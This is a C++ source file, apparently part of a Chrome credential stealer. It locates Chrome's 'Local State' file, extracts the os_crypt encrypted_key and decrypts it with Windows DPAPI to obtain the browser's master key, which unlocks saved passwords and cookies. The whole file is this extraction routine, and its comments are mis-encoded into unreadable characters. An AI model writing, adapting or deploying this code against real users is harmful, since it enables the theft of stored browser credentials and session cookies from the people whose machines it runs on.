//cpp
#include<vector>
#include<iostream>
#include<fstream>
#include<string>
#include<sstream>
//win
#include<Windows.h>
#include<tchar.h>
#include <shlobj.h>
//rapidjson
#include "3rdparts/rapidjson/document.h"


#include "chrome.h"
#include "crypto/crypto.h"
using namespace std;
using namespace rapidjson;

vector<unsigned char> getMasterkey() {
    string Encryptedkey;
	CHAR path[MAX_PATH] = "\\Google\\Chrome\\User Data\\Local State";

	TCHAR buffer[MAX_PATH];
	if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer) == S_OK)
	{
		strcat_s((char*)buffer, MAX_PATH, path);
		strcpy_s(path, MAX_PATH, (const char*)buffer);
	}
	else
	{
        cout << "Failed to get the path" << endl;
    }
//#define D1
#ifdef D1
    ifstream file(path);
    if (!file.is_open()) {
        cout << "Error opening file" << endl;
        // ���������������ʽ�����緵�ش�������׳��쳣
    }
    else {
        stringstream strbuffer;
        strbuffer << file.rdbuf();
        file.close();
        string jsonstr = strbuffer.str();

        cout << "JSON String: " << jsonstr << endl; // �����ȡ��JSON�ַ���������ȷ���Ƿ���ȷ��ȡ���ļ�����

        Document root;
        root.Parse(jsonstr.c_str());//�ַ�����json

        if (root.HasParseError()) {
            cout << "JSON parse error: " << endl;
            // ���������������ʽ�����緵�ش�������׳��쳣
        }
        else {
            Value& infoArray = root["os_crypt"];//json����os_crypt

            if (infoArray.IsObject()) {
                if (infoArray.HasMember("encrypted_key") && infoArray["encrypted_key"].IsString()) {
                    Encryptedkey = infoArray["encrypted_key"].GetString();//os_cr
                    cout << "Encrypted Key: " << Encryptedkey << endl; // ���������Կ������ȷ���Ƿ�ɹ���ȡ�˼�ֵ
                }
                else {
                    cout << "Error accessing encrypted_key" << endl;
                    // ���������������ʽ�����緵�ش�������׳��쳣
                }
            }
            else {
                cout << "os_crypt is not an object" << endl;
                // ���������������ʽ�����緵�ش�������׳��쳣
            }
        }
    }
#else

	ifstream file(path);
	stringstream strbuffer;
	strbuffer << file.rdbuf();
	file.close();
	string jsonstr = strbuffer.str();

	Document root;
	root.Parse(jsonstr.c_str());//�ַ�����json
	Value& infoArray = root["os_crypt"];//json����os_crypt
	Encryptedkey = infoArray["encrypted_key"].GetString();//os_crypt�Ҽ���keyת�ַ����ش���basekey����
#endif
	vector<unsigned char> Decryptedkey;
	DecryptStringWithDPAPI(Encryptedkey, Decryptedkey);

	return Decryptedkey;
}

